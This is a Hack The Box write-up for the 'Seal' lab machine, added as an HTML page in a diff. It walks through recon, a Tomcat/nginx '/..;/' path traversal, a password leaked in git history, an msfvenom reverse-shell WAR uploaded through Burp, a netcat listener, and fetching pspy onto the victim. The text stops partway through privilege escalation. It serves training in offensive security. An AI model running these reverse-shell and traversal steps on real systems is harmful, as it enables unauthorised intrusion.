@@ -1,0 +1,620 @@
+I"��<h2 id="summary">Summary</h2>
+
+<p>10.129.190.13</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Port</th>
+      <th>State</th>
+      <th>Service</th>
+      <th>Version</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22/tcp</td>
+      <td>open</td>
+      <td>ssh</td>
+      <td>OpenSSH 8.2p1 Ubuntu 4ubuntu0.2</td>
+    </tr>
+    <tr>
+      <td>443/tcp</td>
+      <td>open</td>
+      <td>http</td>
+      <td>nginx 1.18.0</td>
+    </tr>
+    <tr>
+      <td>8080/tcp</td>
+      <td>open</td>
+      <td>http-proxy</td>
+      <td> </td>
+    </tr>
+  </tbody>
+</table>
+
+<p>ABOUT THE BOX
+ABOUT THE BOX
+ABOUT THE BOX
+ABOUT THE BOX
+ABOUT THE BOX
+ABOUT THE BOX
+ABOUT THE BOX
+ABOUT THE BOX
+ABOUT THE BOX</p>
+
+<h2 id="initial-recon">Initial Recon</h2>
+
+<p>Use AutoRecon to automate the initial enumeration of the box</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>autorecon <span class="nt">-v</span> 10.129.190.13
+</code></pre></div></div>
+
+<p><img src="assets/seal_screenshots/autorecon.png" alt="autorecon" /></p>
+
+<h2 id="nmap">Nmap</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-vv</span> <span class="nt">--reason</span> <span class="nt">-Pn</span> <span class="nt">-T4</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">--version-all</span> <span class="nt">-A</span> <span class="nt">--osscan-guess</span> <span class="nt">-oN</span> /usr/share/autorecon/results/10.129.190.13/scans/_quick_tcp_nmap.txt <span class="nt">-oX</span> /usr/share/autorecon/results/10.129.190.13/scans/xml/_quick_tcp_nmap.xml 10.129.190.13
+</code></pre></div></div>
+
+<pre><code class="language-txt">Nmap scan report for 10.129.190.13
+Host is up, received user-set (0.010s latency).
+Scanned at 2021-12-14 10:53:03 GMT for 45s
+Not shown: 997 closed tcp ports (reset)
+PORT     STATE SERVICE    REASON         VERSION
+22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC1FohcrXkoPYUOtmzAh5PlCU2H0+sFcGl6XXS6vX2lLJ3RD2Vd+KlcYtc2wQLjcYJhkFe793jmkogOSh0uI+fKQA9z1Ib3J0vtsIaNkXxvSMPcr54QxXgg1guaM1OQl43ePUADXnB6WqAg8QyF6Nxoa18vboOAu3a8Wn9Qf9iCpoU93d5zQj+FsBKVaDs3zuJkUBRfjsqq7rEMpxqCfkFIeUrJF9MBsQhgsEVUbo1zicWG32m49PgDbKr9yE3lPsV9K4b9ugNQ3zwWW5a1OpOs+r3AxFcu2q65N2znV3/p41ul9+fWXo9pm0jJPJ3V5gZphDkXVZEw16K2hcgQcQJUH7luaVTRpzqDxXaiK/8wChtMXEUjFQKL6snEskkRxCg+uLO6HjI19dJ7sTBUkjdMK58TM5RmK8EO1VvbCAAdlMs8G064pSFKxY/iQjp7VWuaqBUetpplESpIe6Bz+tOyTJ8ZyhkJimFG80iHoKWYI2TOa5FdlXod1NvTIkCLD2U=
+|   256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBD+SiHX7ZTaXWFgBUKSVlFmMYtqF7Ihjfdc51aEdxFdB3xnRWVYSJd2JhOX1k/9V62eZMhR/4Lc8pJWQJHdSA/c=
+|   256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXLlJgua8pjAw5NcWgGDwXoASfUOqUlpeQxd66seKyT
+443/tcp  open  ssl/http   syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
+| tls-nextprotoneg: 
+|_  http/1.1
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Seal Market
+| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK/organizationalUnitName=Infra/emailAddress=admin@seal.htb/localityName=Hackney
+| Issuer: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK/organizationalUnitName=Infra/emailAddress=admin@seal.htb/localityName=hackney
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-05-05T10:24:03
+| Not valid after:  2022-05-05T10:24:03
+| MD5:   9c4f 991a bb97 192c df5a c513 057d 4d21
+| SHA-1: 0de4 6873 0ab7 3f90 c317 0f7b 872f 155b 305e 54ef
+| -----BEGIN CERTIFICATE-----
+| MIIDiDCCAnACAWQwDQYJKoZIhvcNAQELBQAwgYkxCzAJBgNVBAYTAlVLMQ8wDQYD
+| VQQIDAZMb25kb24xEDAOBgNVBAcMB2hhY2tuZXkxFTATBgNVBAoMDFNlYWwgUHZ0
+| IEx0ZDEOMAwGA1UECwwFSW5mcmExETAPBgNVBAMMCHNlYWwuaHRiMR0wGwYJKoZI
+| hvcNAQkBFg5hZG1pbkBzZWFsLmh0YjAeFw0yMTA1MDUxMDI0MDNaFw0yMjA1MDUx
+| MDI0MDNaMIGJMQswCQYDVQQGEwJVSzEPMA0GA1UECAwGTG9uZG9uMRAwDgYDVQQH
+| DAdIYWNrbmV5MRUwEwYDVQQKDAxTZWFsIFB2dCBMdGQxDjAMBgNVBAsMBUluZnJh
+| MREwDwYDVQQDDAhzZWFsLmh0YjEdMBsGCSqGSIb3DQEJARYOYWRtaW5Ac2VhbC5o
+| dGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDafbynnscdjWeuXTrD
+| M36rTJ0y2pJpDDFe9ngryz/xw1KsoPfEDrDE0XHc8LVlD9cxXd/8+0feeV34d63s
+| YyZ0t5tHlAKw1h9TEa/og1yR1MyxZRf+K/wcX+OwXYFtMHkXCZFH7TPXLKtCrMJM
+| Z6GCt3f1ccrI10D+/dMo7eyQJsat/1e+6PgrTWRxImcjOCDOZ1+mlfSkvmr5TUBW
+| SU3uil2Qo5Kj9YLCPisjKpVuyhHU6zZ5KuBXkudaPS0LuWQW1LTMyJzlRfoIi9J7
+| E2uUQglrTKKyd3g4BhWUABbwyxoj2WBbgvVIdCGmg6l8JPRZXwdLaPZ/FbHEQ47n
+| YpmtAgMBAAEwDQYJKoZIhvcNAQELBQADggEBAJZGFznhRSEa2DTgevXl1T8uxpiG
+| PPd9R0whiIv3s225ir9SWW3Hl1tVkEY75G4PJA/DxmBIHxIK1OU8kZMuJUevnSIC
+| rK16b9Y5Y1JEnaQwfKCoQILMU40ED76ZIJigGqAoniGCim/mwR1F1r1g63oUttDT
+| aGLrpvN6XVkqSszpxTMMHk3SqwNaKzsaPKWPGuEbj9GGntRo1ysqZfBttgUMFIzl
+| 7un7bBMIn+SPFosNGBmXIU9eyR7zG+TmpGYvTgsw0ZJqZL9yQIcszJQZPV3HuLJ8
+| 8srMeWYlzSS1SOWrohny4ov8jpMjWkbdnDNGRMXIUpapho1R82hyP7WEfwc=
+|_-----END CERTIFICATE-----
+| http-methods: 
+|_  Supported Methods: OPTIONS GET HEAD POST
+8080/tcp open  http-proxy syn-ack ttl 63
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 401 Unauthorized
+|     Date: Tue, 14 Dec 2021 10:53:11 GMT
+|     Set-Cookie: JSESSIONID=node0obtlismw5dqpv9ln8tyuv6nc2.node0; Path=/; HttpOnly
+|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
+|     Content-Type: text/html;charset=utf-8
+|     Content-Length: 0
+|   GetRequest: 
+|     HTTP/1.1 401 Unauthorized
+|     Date: Tue, 14 Dec 2021 10:53:10 GMT
+|     Set-Cookie: JSESSIONID=node0uizqd1i79r56fe1dhijobmfx0.node0; Path=/; HttpOnly
+|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
+|     Content-Type: text/html;charset=utf-8
+|     Content-Length: 0
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Date: Tue, 14 Dec 2021 10:53:11 GMT
+|     Set-Cookie: JSESSIONID=node0ehoxm0jvrhwz19egpk1025hk1.node0; Path=/; HttpOnly
+|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
+|     Content-Type: text/html;charset=utf-8
+|     Allow: GET,HEAD,POST,OPTIONS
+|     Content-Length: 0
+|   RPCCheck: 
+|     HTTP/1.1 400 Illegal character OTEXT=0x80
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 71
+|     Connection: close
+|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character OTEXT=0x80&lt;/pre&gt;
+|   RTSPRequest: 
+|     HTTP/1.1 505 Unknown Version
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 58
+|     Connection: close
+|     &lt;h1&gt;Bad Message 505&lt;/h1&gt;&lt;pre&gt;reason: Unknown Version&lt;/pre&gt;
+|   Socks4: 
+|     HTTP/1.1 400 Illegal character CNTL=0x4
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 69
+|     Connection: close
+|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x4&lt;/pre&gt;
+|   Socks5: 
+|     HTTP/1.1 400 Illegal character CNTL=0x5
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 69
+|     Connection: close
+|_    &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x5&lt;/pre&gt;
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Server returned status 401 but no WWW-Authenticate header.
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Site doesn't have a title (text/html;charset=utf-8).
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8080-TCP:V=7.92%I=9%D=12/14%Time=61B87796%P=x86_64-pc-linux-gnu%r(G
+SF:etRequest,F3,"HTTP/1\.1\x20401\x20Unauthorized\r\nDate:\x20Tue,\x2014\x
+SF:20Dec\x202021\x2010:53:10\x20GMT\r\nSet-Cookie:\x20JSESSIONID=node0uizq
+SF:d1i79r56fe1dhijobmfx0\.node0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Thu
+SF:,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Type:\x20text/html
+SF:;charset=utf-8\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,107,"HTT
+SF:P/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x2014\x20Dec\x202021\x2010:53:11\x
+SF:20GMT\r\nSet-Cookie:\x20JSESSIONID=node0ehoxm0jvrhwz19egpk1025hk1\.node
+SF:0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x200
+SF:0:00:00\x20GMT\r\nContent-Type:\x20text/html;charset=utf-8\r\nAllow:\x2
+SF:0GET,HEAD,POST,OPTIONS\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,
+SF:AD,"HTTP/1\.1\x20505\x20Unknown\x20Version\r\nContent-Type:\x20text/htm
+SF:l;charset=iso-8859-1\r\nContent-Length:\x2058\r\nConnection:\x20close\r
+SF:\n\r\n&lt;h1&gt;Bad\x20Message\x20505&lt;/h1&gt;&lt;pre&gt;reason:\x20Unknown\x20Version&lt;
+SF:/pre&gt;")%r(FourOhFourRequest,F3,"HTTP/1\.1\x20401\x20Unauthorized\r\nDat
+SF:e:\x20Tue,\x2014\x20Dec\x202021\x2010:53:11\x20GMT\r\nSet-Cookie:\x20JS
+SF:ESSIONID=node0obtlismw5dqpv9ln8tyuv6nc2\.node0;\x20Path=/;\x20HttpOnly\
+SF:r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-
+SF:Type:\x20text/html;charset=utf-8\r\nContent-Length:\x200\r\n\r\n")%r(So
+SF:cks5,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x5\r\nConten
+SF:t-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nCon
+SF:nection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20
+SF:Illegal\x20character\x20CNTL=0x5&lt;/pre&gt;")%r(Socks4,C3,"HTTP/1\.1\x20400\
+SF:x20Illegal\x20character\x20CNTL=0x4\r\nContent-Type:\x20text/html;chars
+SF:et=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n&lt;
+SF:h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20character\x20CN
+SF:TL=0x4&lt;/pre&gt;")%r(RPCCheck,C7,"HTTP/1\.1\x20400\x20Illegal\x20character\
+SF:x20OTEXT=0x80\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nConte
+SF:nt-Length:\x2071\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x204
+SF:00&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20character\x20OTEXT=0x80&lt;/pre&gt;");
+OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
+Aggressive OS guesses: Linux 4.15 - 5.6 (94%), Linux 5.3 - 5.4 (94%), Linux 2.6.32 (94%), Linux 5.0 - 5.3 (93%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Crestron XPanel control system (91%), Linux 5.4 (91%), Linux 3.1 - 3.2 (90%)
+No exact OS matches for host (test conditions non-ideal).
+TCP/IP fingerprint:
+SCAN(V=7.92%E=4%D=12/14%OT=22%CT=1%CU=%PV=Y%DS=2%DC=T%G=N%TM=61B877BC%P=x86_64-pc-linux-gnu)
+SEQ(SP=100%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)
+OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)
+WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
+ECN(R=Y%DF=Y%TG=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)
+T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
+T2(R=N)
+T3(R=N)
+T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
+T6(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+T7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
+U1(R=N)
+IE(R=Y%DFI=N%TG=40%CD=S)
+
+Uptime guess: 34.553 days (since Tue Nov  9 21:38:01 2021)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=256 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 995/tcp)
+HOP RTT      ADDRESS
+1   10.47 ms 10.10.14.1
+2   10.48 ms 10.129.190.13
+
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Dec 14 10:53:48 2021 -- 1 IP address (1 host up) scanned in 44.97 seconds
+</code></pre>
+
+<p>Nmap shows the box is probably Ubuntu from the services banners, we can find out which release by looking up the services versions on launchpad.</p>
+
+<p><img src="assets/seal_screenshots/launchpad_openssh_version.png" alt="launchpad" /></p>
+
+<p>Launchpad shows us this version of openssh is for Ubuntu Focal, also known as 20.04.</p>
+
+<h2 id="https-enumeration">HTTPS Enumeration</h2>
+
+<p>Nmap also shows the hostsname <code class="language-plaintext highlighter-rouge">seal.htb</code> in the SSL certificate.</p>
+
+<p>First, let’s look in to the https site. Start by adding the hostname to <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>vim /etc/hosts
+</code></pre></div></div>
+
+<pre><code class="language-txt">10.129.190.13   seal.htb
+</code></pre>
+
+<p>Now we can open the page in the browser, accepting the Self Signed SSL Certificate.</p>
+
+<p><img src="assets/seal_screenshots/accept_selfsignd_cert.png" alt="accept_selfsignd_cert" /></p>
+
+<p>Which brings us to the index page of Seal Market.</p>
+
+<p><img src="assets/seal_screenshots/seal_market_index.png" alt="seal_market_index" /></p>
+
+<p>We can try fuzzing the Search box. I seems to just perfrom a GET request with the searched string.</p>
+
+<p><img src="assets/seal_screenshots/search_fuzz.png" alt="search_fuzz" /></p>
+
+<p>There dosent seem to be any LFI or SQL injection so we move on.</p>
+
+<p>Let’s check the directory fuzzing from AutoRecon’s feroxbuster.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>feroxbuster <span class="nt">-u</span> https://10.129.190.13:443/ <span class="nt">-t</span> 10 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt <span class="nt">-x</span> <span class="s2">"txt,html,php,asp,aspx,jsp"</span> <span class="nt">-v</span> <span class="nt">-k</span> <span class="nt">-n</span> <span class="nt">-q</span> <span class="nt">-o</span> <span class="s2">"/usr/share/autorecon/results/10.129.190.13/scans/tcp443/tcp_443_https_feroxbuster_raft-large-words.txt"</span>
+</code></pre></div></div>
+
+<pre><code class="language-txt">302        0l        0w        0c https://10.129.190.13/admin
+302        0l        0w        0c https://10.129.190.13/images
+302        0l        0w        0c https://10.129.190.13/js
+200      518l     1140w    19737c https://10.129.190.13/index.html
+302        0l        0w        0c https://10.129.190.13/css
+302        0l        0w        0c https://10.129.190.13/manager
+200      518l     1140w    19737c https://10.129.190.13/
+302        0l        0w        0c https://10.129.190.13/icon
+302        0l        0w        0c https://10.129.190.13/host-manager
+</code></pre>
+
+<p>The manager and host-manager layout makes me think of Tomcat. Let’s try to get to the management interface.</p>
+
+<p><img src="assets/seal_screenshots/manager_html_403.png" alt="manager_html" /></p>
+
+<p>We get an nginx 403 forbiden error, intresting.</p>
+
+<p>Trying the /admin directory gets us a tomcat 404 error.</p>
+
+<p><img src="assets/seal_screenshots/admin_404.png" alt="admin_404" /></p>
+
+<p>This makes me think nginx is doing some sort of certificate based routing as we get a forbiden error with no oppertuinity to login.</p>
+
+<p>A quick google for <code class="language-plaintext highlighter-rouge">tomcat nginx exploit</code> brings up an intresting path traversal vuln.</p>
+
+<p><img src="assets/seal_screenshots/google_tomcat_nginx.png" alt="google_tomcat_nginx" /></p>
+
+<p><a href="https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/">Acunetix - Tomcat path traversal via reverse proxy mapping</a></p>
+
+<pre><code class="language-txt">Description
+
+Web servers and reverse proxies normalize the request path. For example, the path /image/../image/ is normalized to /images/. When Apache Tomcat is used together with a reverse proxy such as nginx there is a nromalization inconsistency.
+
+Tomcat will threat the sequence /..;/ as /../ and normalize the path while reverse proxies will not normalize this sequence and send it to Apache Tomcat as it is.
+
+This allows an attacker to access Apache Tomcat resources that are not normally accessible via the reverse proxy mapping.
+Remediation
+
+Configure the reverse proxy to reject paths that contain the Tomcat path parameter character ;.
+</code></pre>
+
+<p>Using the cool path traversal vuln gets us to the login for tomcat html manager.</p>
+
+<p><img src="assets/seal_screenshots/tomcat_manager_login.png" alt="tomcat_manager_login" /></p>
+
+<p>Default credentials don’t log us in, so we need to find the credentials.</p>
+
+<p>We’ve exhausted the tricks for the https page for now, let’s dig in to the ‘httpproxy’ on 8080.</p>
+
+<h2 id="httpproxy-enumeration">HTTPPROXY Enumeration</h2>
+
+<p>The page on 8080 takes us to a gitbucket instance.</p>
+
+<p><img src="assets/seal_screenshots/git_bucket_index.png" alt="git_bucket_index" /></p>
+
+<p>Trying the default gitbucket credentials of <code class="language-plaintext highlighter-rouge">root:root</code> dosen’t log us in, but we can sign up for an account, so we’ll try that.</p>
+
+<p><img src="assets/seal_screenshots/create_account.png" alt="create_account" /></p>
+
+<p><img src="assets/seal_screenshots/sign_in.png" alt="sign_in" /></p>
+
+<p>Logging in to gitbucket gets us 2 Repos. seal_market and infra.</p>
+
+<p><img src="assets/seal_screenshots/gitbucket_home.png" alt="gitbucket_home" /></p>
+
+<p>The infra repo contains tomcat anisble playbooks, but nothing usefull at the moment.</p>
+
+<p><img src="assets/seal_screenshots/infra_repo.png" alt="infra_repo" /></p>
+
+<p>The seal_market contains a tomcat directory, let’s look in to that.</p>
+
+<p><img src="assets/seal_screenshots/seal_market_tomcat_repo.png" alt="seal_market_tomcat_repo" /></p>
+
+<p>Here we see the <code class="language-plaintext highlighter-rouge">tomcat-users.xml</code> file, where tomcat stores it’s credientials. Browsing the current version of the file doesn’t contain any credientals.</p>
+
+<p><img src="assets/seal_screenshots/tomcat_users_current.png" alt="tomcat_users_current" /></p>
+
+<p>But we can use the history button to view older versions of the file.</p>
+
+<p><img src="assets/seal_screenshots/tomcat_users_history.png" alt="tomcat_users_history" /></p>
+
+<p>Viewing the last commit gets us some credentials.</p>
+
+<p><code class="language-plaintext highlighter-rouge">username="tomcat" password="42MrHBf*z8{Z%"</code></p>
+
+<p><img src="assets/seal_screenshots/tomcat_credentails.png" alt="tomcat_credentails" /></p>
+
+<p>Let’s try using them to log in to the tomcat manager.</p>
+
+<p><img src="assets/seal_screenshots/tomcat_manager_login_creds.png" alt="tomcat_manager_login_creds" /></p>
+
+<p>The creds log us in to the tomcat manager page.</p>
+
+<p><img src="assets/seal_screenshots/tomcat_web_manager.png" alt="tomcat_web_manager" /></p>
+
+<h2 id="tomcat-deploy-war-for-rce">Tomcat deploy WAR for RCE</h2>
+
+<p>We can upload a malicous war file to get a reverse shell on the server. We’ll use msfvenom to create the malicious file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.54 <span class="nv">LPORT</span><span class="o">=</span>9001 <span class="nt">-f</span> war <span class="o">&gt;</span> shell.war
+</code></pre></div></div>
+
+<p>To upload the war file we need to intercept the request with burp so that we can use our path traversal exploit, otherwise we will get the nginx 403 page.</p>
+
+<p>Open burp and enable our burp proxy. In the tomcat web manager, under the ‘WAR file to deploy’ section, browse to the location where we created the reverse shell payload.</p>
+
+<p><img src="assets/seal_screenshots/deploy_war.png" alt="deploy_war" /></p>
+
+<p>Click deploy and in burp, change the path of the request to include the path traversal exploit.</p>
+
+<pre><code class="language-txt">POST /manager/..;/manager/html/upload
+</code></pre>
+
+<p><img src="assets/seal_screenshots/burp_edit_deploy_request.png" alt="burp_edit_deploy_request" /></p>
+
+<p>We’ve sucsessfully uploaded our malicious payload.</p>
+
+<p><img src="assets/seal_screenshots/tomcat_manager_shell.png" alt="tomcat_manager_shell" /></p>
+
+<p>Start a netcat listener on our attacking box.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> 9001
+</code></pre></div></div>
+
+<p>Then click the <code class="language-plaintext highlighter-rouge">/shell</code> or browse to the shell at <code class="language-plaintext highlighter-rouge">https://seal.htb/shell</code> and catch the reverse shell on the listener.</p>
+
+<p><img src="assets/seal_screenshots/reverse_shell.png" alt="reverse_shell" /></p>
+
+<p>We can upgrage our shell to a pty with the python method</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>which python
+which python3
+/usr/bin/python3
+python3 <span class="nt">-c</span> <span class="s2">"import pty;pty.spawn('/bin/bash')"</span>
+tomcat@seal:/var/lib/tomcat9<span class="nv">$ </span>^Z
+<span class="o">[</span>1]  + 52571 suspended  nc <span class="nt">-lvnp</span> 9001
+tuz:exploit/ <span class="nv">$ </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>                                                                                 <span class="o">[</span>13:40:11]
+<span class="o">[</span>1]  + 52571 continued  nc <span class="nt">-lvnp</span> 9001
+
+tomcat@seal:/var/lib/tomcat9<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
+</code></pre></div></div>
+
+<p><img src="assets/seal_screenshots/python_pty.png" alt="python_pty" /></p>
+
+<h2 id="privesc-to-user">PrivEsc to User</h2>
+
+<p>Now we have a shell as tomcat we need find a way to root.</p>
+
+<p>Let’s find out what user accounts are on the box with login shells.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /etc/passwd | <span class="nb">grep</span> <span class="s1">'/bin'</span> | <span class="nb">grep</span> <span class="s1">'sh'</span>
+root:x:0:0:root:/root:/bin/bash
+luis:x:1000:1000:,,,:/home/luis:/bin/bash
+</code></pre></div></div>
+
+<p>Poking around luis’s home directory we don’t find anything usefull, and there’s nothing in the crontab.
+But we find an ansible playbook in <code class="language-plaintext highlighter-rouge">/opt/backups/playbook/run.yml</code></p>
+
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="pi">-</span> <span class="na">hosts</span><span class="pi">:</span> <span class="s">localhost</span>
+  <span class="na">tasks</span><span class="pi">:</span>
+  <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">Copy Files</span>
+    <span class="na">synchronize</span><span class="pi">:</span> <span class="s">src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes</span>
+  <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">Server Backups</span>
+    <span class="na">archive</span><span class="pi">:</span>
+      <span class="na">path</span><span class="pi">:</span> <span class="s">/opt/backups/files/</span>
+      <span class="na">dest</span><span class="pi">:</span> <span class="s2">"</span><span class="s">/opt/backups/archives/backup--.gz"</span>
+  <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">Clean</span>
+    <span class="na">file</span><span class="pi">:</span>
+      <span class="na">state</span><span class="pi">:</span> <span class="s">absent</span>
+      <span class="na">path</span><span class="pi">:</span> <span class="s">/opt/backups/files/</span>
+</code></pre></div></div>
+
+<p>Let’s upload <a href="https://github.com/DominicBreuker/pspy">pspy</a> and see if this playbook is being executed as another user.</p>
+
+<p>Download then host it from our attacker box.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80
+</code></pre></div></div>
+
+<p>Download it to our victim, chmod it to be executable, then run it</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://10.10.14.54/pspy64<span class="p">;</span> <span class="nb">chmod</span> +x pspy64<span class="p">;</span> ./pspy64
+</code></pre></div></div>
+
+<p><img src="assets/seal_screenshots/download_pspy.png" alt="download_pspy" /></p>
+
+<p><img src="assets/seal_screenshots/pspy_output.png" alt="pspy_output" /></p>
+
+<p>Every minuite there’s a cron running the playbook as luis.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/sbin/CRON <span class="nt">-f</span>
+/bin/sh <span class="nt">-c</span> <span class="nb">sleep </span>30 <span class="o">&amp;&amp;</span> <span class="nb">sudo</span> <span class="nt">-u</span> luis /usr/bin/ansible-playbook /opt/backups/playbook/run.yml
+</code></pre></div></div>
+
+<p>The backups playbook uses the ansible <code class="language-plaintext highlighter-rouge">sysnchronise</code> plugin. Googling this leads us to the <a href="https://docs.ansible.com/ansible/latest/collections/ansible/posix/synchronize_module.html">anisble sysnchronise docs</a> where we see that it is an rsync wrapper and that <code class="language-plaintext highlighter-rouge">copy_links=yes</code> copys the source of the symlink instead of the symlink it’s self.</p>
+
+<p>We also find that we have write permissions in the <code class="language-plaintext highlighter-rouge">uploads</code> directory it’s backing up.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-la</span> /var/lib/tomcat9/webapps/ROOT/admin/dashboard
+total 100
+drwxr-xr-x 7 root root  4096 May  7  2021 <span class="nb">.</span>
+drwxr-xr-x 3 root root  4096 May  6  2021 ..
+drwxr-xr-x 5 root root  4096 Mar  7  2015 bootstrap
+drwxr-xr-x 2 root root  4096 Mar  7  2015 css
+drwxr-xr-x 4 root root  4096 Mar  7  2015 images
+<span class="nt">-rw-r--r--</span> 1 root root 71744 May  6  2021 index.html
+drwxr-xr-x 4 root root  4096 Mar  7  2015 scripts
+drwxrwxrwx 2 root root  4096 May  7  2021 uploads
+</code></pre></div></div>
+
